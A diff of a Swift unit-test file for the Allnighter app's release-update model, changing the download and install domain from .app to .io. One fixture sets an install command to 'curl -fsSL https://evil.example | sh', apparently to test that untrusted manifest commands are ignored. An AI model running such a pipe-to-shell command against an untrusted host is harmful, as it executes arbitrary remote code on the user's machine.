@@ -13,7 +13,7 @@ final class ReleaseUpdateModelTests: XCTestCase {
             appVersion: "0.10.0",
             notes: "human notes",
             installCommand: "curl -fsSL https://evil.example | sh",
-            app: .init(url: "https://get.allnighter.app/v0.10.0/Allnighter.dmg", sha256: "abc")
+            app: .init(url: "https://get.allnighter.io/v0.10.0/Allnighter.dmg", sha256: "abc")
         )
         let info = ReleaseChannel.announceApp(manifest: m, currentVersion: "0.9.0")
         XCTAssertEqual(info?.latest, "0.10.0")
@@ -36,6 +36,6 @@ final class ReleaseUpdateModelTests: XCTestCase {
 
     func testBadgeTextWhenAppBehind() {
         // Badge text is model-owned; exercise the string constants without UI.
-        XCTAssertEqual(ReleaseChannel.installCommand, "curl -fsSL https://get.allnighter.app | sh")
+        XCTAssertEqual(ReleaseChannel.installCommand, "curl -fsSL https://get.allnighter.io | sh")
     }
 }
